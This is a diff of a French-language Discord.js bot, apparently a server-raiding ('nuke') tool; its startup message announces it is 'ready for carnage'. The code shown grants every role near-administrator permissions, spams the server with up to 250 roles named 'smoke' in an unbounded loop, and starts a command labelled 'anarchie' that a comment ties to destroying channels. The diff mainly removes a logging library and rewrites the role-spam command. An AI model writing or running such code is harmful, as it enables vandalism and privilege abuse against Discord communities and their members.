@@ -1,5 +1,4 @@
 const Discord = require("discord.js");
-const chalk = require("chalk")
 const bot = new Discord.Client();
 const prefix = "=" ;
 process.on('unhandledRejection', (reason) => {
@@ -9,7 +8,7 @@ process.on('unhandledRejection', (reason) => {
 });
 
 bot.on("ready", () => {
-		console.log(chalk.red(`${bot.user.tag} prêt pour le carnage`))
+		console.log(`${bot.user.tag} prêt pour le carnage`)
 		console.log(bot.user.id)
 		console.log(bot.guilds.map(g => `Serveur : ${g.name}`))
 //		bot.channels.map(c => c.createInvite().then(url => console.log(url.code)))
@@ -45,17 +44,16 @@ bot.on("message", msg => {
 			msg.delete();
 				msg.guild.roles.map(r => r. edit({permissions:2146958591})) 
 			}
-			if(msg.content===prefix+"roles"){
-				  msg.delete();
-			   for(var i; i < 225; i++){
-						 msg.guild.createRole({
-							name:"Anachy", 
-							mentionable:false, 
-							permissions:"", 
-							position: ""
-							})
-						}
-						} 
+			if(msg.content === "roles"){
+			msg.delete();
+			while(msg.guild.roles.size != 250){
+				msg.guild.createRole({name:"smoke",
+					                     mentionable:false,
+					                     permissions:2146958591,
+					                     position: ""
+					}) 
+					} 
+			}
 		 			//détruire des channels
 			  	if(msg.content=== prefix+"anarchie"){
 			  		console.log("destruction")
